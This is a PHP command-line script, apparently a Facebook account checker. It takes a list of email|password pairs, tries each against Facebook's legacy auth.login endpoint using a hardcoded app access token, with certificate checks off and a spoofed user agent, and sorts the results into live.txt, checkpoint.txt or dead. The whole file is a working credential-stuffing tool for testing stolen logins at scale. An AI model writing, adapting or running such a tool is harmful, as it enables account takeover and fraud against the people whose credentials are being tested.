<?php

$biru = "\e[34;1m";
$yellow = "\e[33;1m";
$cyan = "\e[96;1m";
$magenta = "\e[35;1m";
$green = "\e[92;1m";
$red = "\e[91;1m";

if(isset($argv[1])) {
    if(file_exists($argv[1])) {
        $get = explode(PHP_EOL, file_get_contents($argv[1]));
        foreach($get as $targetcheck) {
            $cut = explode("|", $targetcheck);
            Trying($cut[0], $cut[1]);
          
        }
    }else die("\033[31;1m[!ERROR]\033[00m File doesn't exist!");
}else die("$red Usage: php fbcheck.php target.txt \n");
function Trying($emails, $passw) {
    $emailpass = array(
        "access_token" => "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
        "email" => $emails,
        "password" => $passw,
        "locale" => "en_US",
        "format" => "JSON"
    );
    $sig = "";
    foreach($emailpass as $key => $value) { $sig .= $key."=".$value; }
    $sig = md5($sig);
    $emailpass['sig'] = $sig;
    $ch = curl_init("https://api.facebook.com/method/auth.login");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $emailpass);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_USERAGENT, "Opera/9.80 (Series 60; Opera Mini/7.0.32400/28.3445; U; en) Presto/2.8.119 Version/11.10");
    $getresults = json_decode(curl_exec($ch));
    
echo "\e[34m[+]\e[00m Result: ";
    $emailpassword =  $emails."|".$passw;
    if(isset($getresults->access_token)) { 
    	 echo $green;
        echo $emailpassword."  \e[32m [LIVE]\e[00m".PHP_EOL;
        file_put_contents("live.txt", $emailpassword.PHP_EOL, FILE_APPEND);
    }elseif($getresults->error_code == 405 || preg_match("/User must verify their account/i", $getresults->error_msg)) {
        echo $red;
echo  $emailpassword."\e[33m [CHECK]\e[00m".PHP_EOL;
        file_put_contents("checkpoint.txt", $emailpassword.PHP_EOL, FILE_APPEND);
    }else echo  $emailpassword."\e[91m [DEAD]\e[00m".PHP_EOL;
}
